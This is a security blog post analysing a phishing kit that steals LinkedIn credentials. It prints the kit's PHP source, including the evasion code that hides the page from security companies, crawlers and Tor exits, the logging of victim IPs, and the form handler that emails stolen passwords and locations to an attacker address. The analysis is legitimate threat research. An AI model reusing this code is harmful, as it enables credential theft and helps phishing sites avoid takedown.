<!DOCTYPE html>
<html lang="en">

    <head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="Content-Language" content="en">

	<meta name="author" content="Andrea Palmieri">
	<meta name="description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
 How this phishing kit looks like when deployed
  At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:">
	<meta name="keywords" content="blog, infosec, security, cyber security">

	<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)"/>
<meta name="twitter:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
 How this phishing kit looks like when deployed
  At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:"/>

	<meta property="og:title" content="Phishing findings, campaign #2: content.zip (LinkedIn)" />
<meta property="og:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
Let&rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:
 How this phishing kit looks like when deployed
  At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/phishing-findings-2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-07-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-07-08T00:00:00+00:00" />



	
	<base href="/posts/phishing-findings-2/">
	
	<title>
  Phishing findings, campaign #2: content.zip (LinkedIn) · andpalmier
</title>

	
	<link rel="canonical" href="/posts/phishing-findings-2/">
	

	<link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

	
	
	
	<link rel="stylesheet" href="/css/coder.min.d5c572a4dda2996f45f4bd9e584d43751439ce2134c33701e8d32920cc8e7d92.css" integrity="sha256-1cVypN2imW9F9L2eWE1DdRQ5ziE0wzcB6NMpIMyOfZI=" crossorigin="anonymous" media="screen" />
	

	

	
	
	
	
	<link rel="stylesheet" href="/css/coder-dark.min.58ba09b2c45d36fcfc1a96c8ad83bbbc03a9de4bce8463f3c30a896134febfb3.css" integrity="sha256-WLoJssRdNvz8GpbIrYO7vAOp3kvOhGPzwwqJYTT&#43;v7M=" crossorigin="anonymous" media="screen" />
	
	

	
	<link rel="stylesheet" href="/css/extra-style.css" />
	

	

	<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
	<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

	

	<meta name="generator" content="Hugo 0.92.2" />
    </head>

    
    
    
    
    <body class="colorscheme-dark"

	  onload=""
	  >
	  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


	  <main class="wrapper">
	      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      andpalmier
    </a>
    
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="/">Home</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="/about/">About</a>
          </li>
        
      
      
    </ul>
    
  </section>
</nav>


	      <div class="content">
		  
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Phishing findings, campaign #2: content.zip (LinkedIn)</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2020-07-08T00:00:00Z'>
                July 8, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              8-minute read
            </span>
          </div>
          <div class="categories">
  <i class="fas fa-folder"></i>
    <a href="/categories/phishing/">phishing</a></div>

          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="/tags/phishing/">phishing</a>
      <span class="separator">•</span>
    <a href="/tags/phishingkit/">phishingkit</a>
      <span class="separator">•</span>
    <a href="/tags/linkedin/">linkedin</a></div>

        </div>
      </header>

      <div>
        
        <figure><img src="/images/posts/phishing-findings/sampei.jpeg"/>
</figure>

<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier">here</a> if you are interested!
In this series of posts I am going to analyze and discuss some of the phishing kits found online.</p>
<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning</h2>
<p>The kit was created to steal LinkedIn credentials:</p>
<figure><img src="/images/posts/phishing-findings/ep2/content.png"
         alt="How this phishing kit looks like when deployed"/><figcaption>
            <p>How this phishing kit looks like when deployed</p>
        </figcaption>
</figure>

<p>At a first look, we can notice some characteristics of this page which makes it different from the usual fake login:</p>
<ul>
<li>the message at the top: <em>&ldquo;Send Your Product quotes to interested buyers via LinkedIn&rdquo;</em></li>
<li>the two input fields for the password (and the missing <em>&lsquo;Forgot password?'</em> link)</li>
<li>the message under the <em>Continue</em> button: <em>&ldquo;By clicking Continue you proceed to send your business catalogues and quotes&rdquo;</em></li>
</ul>
<p>So this page is not targeting the usual LinkedIn user: it is pretending to provide a feature to send catalogues and quotes using the social network.</p>
<p>Let&rsquo;s now check the zip of this kit on VirusTotal, using <code>sha256sum</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sha256sum content.zip
e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b  content.zip
</code></pre></div><figure><img src="/images/posts/phishing-findings/ep2/vtcontentzip.png"
         alt="VirusTotal detections for the zip of this phishing kit"/><figcaption>
            <p><a href="https://www.virustotal.com/gui/file/e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b/detection">VirusTotal detections for the zip of this phishing kit</a></p>
        </figcaption>
</figure>

<h2 id="explore-the-kit">Explore the kit</h2>
<p>If we extract the archive, we will see the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tree -a content
content
├── blocker.php
├── .htaccess
├── index.php
├── Linkedin
│   ├── geoplugin.class.php
│   ├── index.php
│   └── loginss.php
├── robots.txt
└── vu.txt

<span style="color:#ae81ff">1</span> directory, <span style="color:#ae81ff">7</span> files
</code></pre></div><p>This kit is simpler than the one analyzed in <a href="https://andpalmier.github.io/posts/phishing-findings-1/">the previous post</a>, and it contains only the LinkedIn template. The presence of a <em>txt</em> file (<code>vu.txt</code>) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a <code>.htaccess</code> and <code>robots.txt</code> files are shipped with the kit itself.</p>
<h2 id="entry-point">Entry point</h2>
<p>So we can start our analysis from the entry point (<code>index.php</code>), here are the first lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$emai <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;user&#39;</span>];
<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;blocker.php&#39;</span>);
$DIR<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">100000000000</span>));
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">recurse_copy</span>($home,$DIR) {
    $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>($home);
    <span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($DIR);
    <span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">false</span> <span style="color:#f92672">!==</span> ( $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>($dir)) ) {
	    <span style="color:#66d9ef">if</span> (( $file <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;.&#39;</span> ) <span style="color:#f92672">&amp;&amp;</span> ( $file <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;..&#39;</span> )) {
		    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">is_dir</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file) ) {
			    <span style="color:#a6e22e">recurse_copy</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file,$DIR <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file);
		    } <span style="color:#66d9ef">else</span> {
			    <span style="color:#a6e22e">copy</span>($home <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file,$DIR <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $file);
		    }
	    }
    }
    <span style="color:#a6e22e">closedir</span>($dir);
}
$home<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Linkedin&#34;</span>;
<span style="color:#a6e22e">recurse_copy</span>( $home, $DIR );
</code></pre></div><p>We will take a look at <code>blocker.php</code> in the next paragraph, for now, let&rsquo;s just say that it is included, and let&rsquo;s focus on the following lines.
A new directory is created using <code>@mkdir</code>, and it has a name obtained from the <em>md5</em> hash of a random number: this means that a new folder will be created every time <code>index.php</code> is reached. The files included in the <em>&lsquo;Linkedin&rsquo;</em> folder are then copied in this newly created folder using the <code>recurse_copy</code> function.</p>
<p>Let&rsquo;s continue with the definition of a header:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location:</span><span style="color:#e6db74">$DIR</span><span style="color:#e6db74">?user=</span><span style="color:#e6db74">$emai</span><span style="color:#e6db74">&amp;.verify?service=mail&amp;data:text/html;charset=utf-8;base64,
</span><span style="color:#e6db74">PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#34;</span>);
</code></pre></div><p>Some parameters are specified for a redirection: <em>location</em> is equal to the newly created folder, <em>user</em> equal to <code>$_GET['user']</code> (it will be used to automatically fill the email address in the fake LinkedIn form) and <em>service</em> is set to <em>mail</em>. This header also includes a base64 string which can easily be decoded:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#39;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#39;</span> | base64 -d
&lt;html&gt;
&lt;style&gt; body <span style="color:#f92672">{</span> margin: 0; overflow: hidden; <span style="color:#f92672">}</span> &lt;/style&gt;
  &lt;ifram%
</code></pre></div><p>To be honest, I didn&rsquo;t really get the point of encoding some HTML code in base64 and place it in the header, ping me if you have any idea.</p>
<p>Anyway, here is the rest of <code>index.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>);
$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;vu.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
<span style="color:#a6e22e">fwrite</span>($file,$ip<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;  -  &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmdate</span> (<span style="color:#e6db74">&#34;Y-n-d&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; @ &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmdate</span> (<span style="color:#e6db74">&#34;H:i:s&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</code></pre></div><p>Where the IP address of the victim is appended to <code>vu.txt</code> with a timestamp. As we saw while checking the structure of the kit, <code>vu.txt</code> is not created while executing these lines. If we check the content of the file before running <code>index.php</code>, it contains:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">127.0.0.1  -  2017-8-14 @ 20:49:14
127.0.0.1  -  2017-8-14 @ 20:49:48
</code></pre></div><p>These information were probably left by the developer of the kit; and gives us an idea about when the kit was created/released.</p>
<h2 id="hiding-techniques">Hiding techniques</h2>
<p>Many phishing kits try to hide themselves from bots or web sandbox. In this case, the kit uses 3 techniques:</p>
<ol>
<li><code>robots.txt</code></li>
<li><code>.htaccess</code></li>
<li><code>blocker.php</code></li>
</ol>
<h3 id="robotstxt">robots.txt</h3>
<p>This file is used by web developers to give information to web crawlers about the structure of the site. In this case:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">User-agent: *
Disallow: /
</code></pre></div><p>specifies that every crawler (no matter the User-Agent string) should not navigate in the site. This is commonly used to avoid being indexed by search engines.</p>
<h3 id="htaccess">.htaccess</h3>
<p><code>.htaccess</code> is a configuration file for Apache Web servers. It can be used to alter the settings, configurations and functionalities of Apache Web servers. In the case of this kit, the file is used to deny access to specific subnets and bots.</p>
<p>The <code>.htaccess</code> provided in the kit can be dived in two main parts. The first one uses <code>deny from</code> with a long list of subnets and domain names (almost 6000). Here are some lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[..]
deny from 66.235.132.121/22
deny from 66.235.133.14/22
[...]
deny from google.com
deny from paypal.com
[..]
</code></pre></div><p>Blocked visitors will be shown the error message <em>403 Forbidden</em>. At the end of this part of the file, <code>allow from all</code> is used to allow access to all the other subnets.</p>
<p>The second part is used to block bots, and it uses the following syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[..]
RewriteCond %{HTTP_USER_AGENT} ^HMView [OR]
RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR]
RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR]
[..]
</code></pre></div><p>This part of the file embedded is pasted from an example provided in a <a href="http://www.htaccess-guide.com/blocking-offline-browsers-and-bad-bots/">tutorial called <em>Blocking offline browsers and &lsquo;bad bots&rsquo;</em></a>.</p>
<h3 id="blockerphp">blocker.php</h3>
<p>Similarly to the previous files, <code>blocker.php</code> is used to prevent some hosts to access the site. It is included in the entry point of the kit and it contains:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$hostname <span style="color:#f92672">=</span> <span style="color:#a6e22e">gethostbyaddr</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
$blocked_words <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;above&#34;</span>,<span style="color:#e6db74">&#34;google&#34;</span>,<span style="color:#e6db74">&#34;softlayer&#34;</span>,<span style="color:#e6db74">&#34;amazonaws&#34;</span>,<span style="color:#e6db74">&#34;cyveillance&#34;</span>,<span style="color:#e6db74">&#34;phishtank&#34;</span>,
    <span style="color:#e6db74">&#34;dreamhost&#34;</span>,<span style="color:#e6db74">&#34;netpilot&#34;</span>,<span style="color:#e6db74">&#34;calyxinstitute&#34;</span>,<span style="color:#e6db74">&#34;tor-exit&#34;</span>, <span style="color:#e6db74">&#34;paypal&#34;</span>);
<span style="color:#66d9ef">foreach</span>($blocked_words <span style="color:#66d9ef">as</span> $word) {
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr_count</span>($hostname, $word) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;HTTP/1.0 404 Not Found&#34;</span>);
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.&#34;</span>);

    }
}
$bannedIP <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;^66.102.*.*&#34;</span>, <span style="color:#e6db74">&#34;^38.100.*.*&#34;</span>, <span style="color:#e6db74">&#34;^107.170.*.*&#34;</span><span style="color:#f92672">...</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>],$bannedIP)) {
     <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>);
     <span style="color:#66d9ef">exit</span>();
} <span style="color:#66d9ef">else</span> {
     <span style="color:#66d9ef">foreach</span>($bannedIP <span style="color:#66d9ef">as</span> $ip) {
          <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $ip <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span>,$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>])){
               <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>);
               <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.&#34;</span>);
          }
     }
}

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;google&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;msnbot&#39;</span>)
    <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;Yahoo! Slurp&#39;</span>) <span style="color:#66d9ef">or</span> [<span style="color:#f92672">...</span>] ) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) { <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>); <span style="color:#66d9ef">exit</span>; }
</code></pre></div><p>As seen in the code, the access is granted only if hostname, IP address and User-Agent string of the client are not included in a list of harcoded values. A <em>404 Not Found</em> error is shown otherwise.</p>
<p>Note that many of the hardcoded values contained in <code>bannedIP</code> and in the User-Agent check were omitted from the lines above to make the code more readable.</p>
<h2 id="the-phishing-page">The phishing page</h2>
<p>We already saw that <code>index.php</code> redirects the client into the folder with a random name: this contains the same files of the <code>LinkedIn</code> folder found in the kit. The purpose of this trick is to have a different URL for every execution of <code>index.php</code>.</p>
<p>I didn&rsquo;t find an online instance of the kit, but we can use <code>php</code> to run it locally:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">php -S localhost:8000
</code></pre></div><p>If we go to <code>localhost:8000</code>, the connection will be redirected to a page similar to this:</p>
<figure><img src="/images/posts/phishing-findings/ep2/contentphplocal.png"
         alt="Local deployment of this phishing kit"/><figcaption>
            <p>Local deployment of this phishing kit</p>
        </figcaption>
</figure>

<p>You can see that the URL contains the random <em>md5</em> string obtained in <code>index.php</code>.</p>
<p>Let&rsquo;s take a look at the PHP code of the phishing page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$emai <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;user&#39;</span>];
$IP <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
$geopluginURL<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://www.geoplugin.net/php.gp?ip=&#39;</span><span style="color:#f92672">.</span>$IP;
$addrDetailsArr <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">file_get_contents</span>($geopluginURL));
$city <span style="color:#f92672">=</span> $addrDetailsArr[<span style="color:#e6db74">&#39;geoplugin_city&#39;</span>];
$country <span style="color:#f92672">=</span> $addrDetailsArr[<span style="color:#e6db74">&#39;geoplugin_countryName&#39;</span>];

<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$city){
   $city<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Not Define&#39;</span>;
}
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$country){
   $country<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Not Define&#39;</span>;
}
</code></pre></div><p>In this first part, the IP address and the location information of the client are gathered. Again, we see the use of geoplugin (and again, with the old address geoplugin.net) in order to infer the city and the country from the IP address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span>($_POST <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>], $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])){
    $ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]) <span style="color:#f92672">?</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
    $email_to <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;simon@wmbrep.biz&#34;</span>;
    $email_subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Linked&#34;</span>;
    $email_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;simon-walter&#34;</span>;
    $email <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>];
    $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
    $cpass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;cpass&#39;</span>];
    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Email: &#34;</span><span style="color:#f92672">.</span>($email)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Password: &#34;</span><span style="color:#f92672">.</span>($pass)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;IP: &#34;</span><span style="color:#f92672">.</span>($ip)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Country: &#34;</span><span style="color:#f92672">.</span>($country)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;City: &#34;</span><span style="color:#f92672">.</span>($city)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;From: &#39;</span><span style="color:#f92672">.</span>$email_from<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
</code></pre></div><p>This part of the code defines the options for sending the email. We can see the exfiltration email where all the stolen credentials will be sent (<code>simon@wmbrep.biz</code>), the header of <em>email_from</em> containing <code>simon-walter</code> as well as the subject (<em>Linked</em>) and the message of the email, which - as expected - contains the email address, password, IP address, country and city of the victim.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$email) {
        $emailErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please enter your  Email&#34;</span>;
    } <span style="color:#66d9ef">elseif</span>(<span style="color:#f92672">!</span>$email <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^\S+@\S+$/&#34;</span>, $email)) {
        $emailErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please enter a valid Email&#34;</span>;
    } <span style="color:#66d9ef">elseif</span>(<span style="color:#f92672">!</span>$pass) {
        $passErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Password is required&#34;</span>;
    } <span style="color:#66d9ef">elseif</span>($pass <span style="color:#f92672">!=</span> $cpass){
        $cpassErr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Both Passwords Must Match&#34;</span>;
    } <span style="color:#66d9ef">else</span> {
        $gotten <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Login Error,Wrong Email or Password, Try Again&#34;</span>;
        <span style="color:#a6e22e">mail</span>($email_to, $email_subject, $email_message, $headers);
    }
}<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>In these last lines, the string contained in the email address input field is checked against a regular expression to determine if it is a valid email address; an error message is shown otherwise. There are also two additional checks for the password (if the password is entered and if it is the same in the <em>Password</em> input field and in the <em>Confirm Password</em> one). The email is then sent as usual with the PHP function <code>mail()</code>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this post we analyzed <code>content.zip</code>: a phishing kit which tricks victims into giving their LinkedIn credentials and pretends to provide a feature to <em>&lsquo;send your business catalogues and quotes via LinkedIn&rsquo;</em>.</p>
<p>While the exfiltration method used is somehow similar to the one we saw in <a href="https://andpalmier.github.io/posts/phishing-findings-1/">the first episode of this series</a>, this analysis provides interesting findings, especially with the <em>&lsquo;hiding techniques&rsquo;</em> used with: <code>robots.txt</code>, <code>.htaccess</code> and <code>blocker.php</code>.</p>
<p>Even if the phishing page is always the same, the kit puts it in a new URL at every new visit; so that every victim will have a different URL. The kit also provides logging capabilities for IP address of the victims in <code>vu.txt</code>.</p>

      </div>


      <footer>
        


        
        
        
      </footer>
    </article>

    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
  <script>
    MathJax = {
      tex: {
        inlineMath: [
          ['$', '$'], ['\\(', '\\)']
        ],
        processEscapes: true,
        processEnvironments: true
      },
      options: {
        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
      }
    };
  </script>
  </section>

	      </div>

	<footer class="footer">

<hr>

    <section class="container">
	
	<p>If you have comments or suggestions, feel free to ping me!</p>
	
	
	
	


<ul>
    
    
    <li>
	<a href="https://twitter.com/andpalmier/" aria-label="Twitter"  target="_blank" >
	    <i class="fab fa-twitter" aria-hidden="true"></i>
	</a>
